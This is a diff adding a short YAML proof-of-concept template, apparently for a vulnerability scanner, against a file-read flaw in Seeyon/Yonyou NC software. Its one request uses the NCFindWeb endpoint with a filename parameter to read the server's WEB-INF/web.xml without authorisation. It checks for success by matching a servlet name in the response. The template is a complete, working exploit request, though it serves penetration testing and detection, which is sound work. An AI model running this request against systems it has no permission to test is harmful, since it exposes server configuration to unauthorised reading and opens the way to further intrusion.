@@ -1,0 +1,21 @@
+id: poc-yaml-seeyon-wooyun-2015-148227
+info:
+  name: Seeyon Wooyun 2015 148227
+  severity: high
+  tags:
+  - 文件读取
+  finger: Seeyon Wooyun
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "<servlet-name>NCInvokerServlet</servlet-name>")
+  output: []
